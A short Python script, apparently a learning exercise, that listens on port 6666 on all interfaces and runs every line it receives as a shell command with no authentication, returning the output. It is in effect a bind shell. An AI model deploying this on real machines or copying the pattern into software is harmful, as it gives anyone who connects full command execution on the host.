import socket
import os
import subprocess

HOST = ''
PORT = 6666

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  #socket connection established
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT)) #binding to the port
s.listen()#listening for connections
print(f"Listening on port {PORT}...")
conn, addr = s.accept()#accepting connections
conn.sendall("Welcome to the echo server!\n".encode())
print(f"Connected with {addr}")
conn.sendall("Command Server Developed by LAHTP ADVANCE \n\n$ ".encode())  #initial prompt
while True: #connect
    data = conn.recv(1024)#receiving data
    if not data:
        print("No data received. Closing connection.")
        break
    data = data.decode()
    data = data.strip()
    print(f"Command recived: {data}")
    if data == 'quit': 
        print("Got 'quit' command. Closing connection.")
        break
    # print(f"Received: {data.strip()}")
    # data = "echo::"+data
    # conn.sendall(data.encode())
    else:
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        (out , err) = proc.communicate()
        data = "\n" + out.decode()
        data = data + "\r\n$ "
        conn.sendall(data.encode())#responding back to the client
conn.close()#closing connection
s.close()#closing socket
print("Server shutdown.")